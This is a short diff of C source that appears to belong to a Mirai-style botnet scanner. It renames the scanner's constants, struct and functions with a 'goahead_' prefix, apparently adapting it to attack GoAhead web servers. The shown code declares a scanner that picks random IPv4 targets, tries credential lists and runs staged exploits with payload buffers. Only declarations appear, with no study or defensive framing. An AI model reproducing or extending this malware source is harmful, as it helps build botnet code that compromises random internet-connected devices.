@@ -4,34 +4,34 @@
 
 #include "includes.h"
 
-#define SCANNER_MAX_CONNS 128
-#define SCANNER_RAW_PPS 160
+#define GOAHEAD_SCANNER_MAX_CONNS 128
+#define GOAHEAD_SCANNER_RAW_PPS 160
 
-#define SCANNER_RDBUF_SIZE 256
-#define SCANNER_HACK_DRAIN 64
+#define GOAHEAD_SCANNER_RDBUF_SIZE 256
+#define GOAHEAD_SCANNER_HACK_DRAIN 64
 
-struct scanner_connection
+struct goahead_scanner_connection
 {
     int fd, last_recv;
     enum
     {
-        SC_CLOSED,
-        SC_CONNECTING,
-        SC_GET_CREDENTIALS,
-        SC_EXPLOIT_STAGE2,
-        SC_EXPLOIT_STAGE3,
+        GOAHEAD_SC_CLOSED,
+        GOAHEAD_SC_CONNECTING,
+        GOAHEAD_SC_GET_CREDENTIALS,
+        GOAHEAD_SC_EXPLOIT_STAGE2,
+        GOAHEAD_SC_EXPLOIT_STAGE3,
     } state;
     ipv4_t dst_addr;
     uint16_t dst_port;
     int rdbuf_pos;
-    char rdbuf[SCANNER_RDBUF_SIZE];
+    char rdbuf[GOAHEAD_SCANNER_RDBUF_SIZE];
     char **credentials;
     char payload_buf[256], payload_buf2[256];
     int credential_index;
 };
 
-void scanner_init();
-void scanner_kill(void);
+void goahead_init();
+void goahead_kill(void);
 
-static void setup_connection(struct scanner_connection *);
-static ipv4_t get_random_ip(void);
+static void goahead_setup_connection(struct goahead_scanner_connection *);
+static ipv4_t goahead_get_random_ip(void);
